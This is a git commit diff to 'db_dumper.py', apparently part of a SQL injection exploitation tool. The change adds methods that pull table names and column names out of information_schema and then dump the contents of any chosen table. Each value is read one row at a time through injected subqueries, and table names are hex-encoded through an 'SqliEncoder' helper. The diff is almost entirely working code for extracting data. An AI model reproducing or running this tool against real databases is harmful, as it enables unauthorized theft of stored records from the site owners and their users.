b4056cf61dd158b74f6e0e4157281a229e058e0e
root <root@localhost.localdomain>
2018-11-20 11:35:01 -0500

    db dumper : list tables, columns and fields content.

--- db_dumper.py
+++ db_dumper.py
@@ -1,19 +1,25 @@
 from string_finder import StringFinder
+from tools import SqliEncoder
 
 class DbDumper:
     
     def __init__(self, string_finder):
         self.sf = string_finder
 
-
     def tables(self):
         return self.list_query('table_name', 'information_schema.tables')
 
-    def list_query(self, field, table):
+    def columns(self, table):
+        return self.list_query('column_name', 'information_schema.columns', "WHERE table_name = {}".format(SqliEncoder.str_to_hexa(table)))
+
+    def content(self, table, column):
+        return self.list_query(column, table)    
+
+    def list_query(self, field, table, where = ''):
         items_ = []
         i = 0        
         while True:
-            item = self.sf.read_string("(SELECT {} from {} LIMIT 1 OFFSET {})".format(field, table, i))
+            item = self.sf.read_string("(SELECT {} from {} {} LIMIT 1 OFFSET {})".format(field, table, where, i))
             if item == None:
                 break;
             items_.append(item)
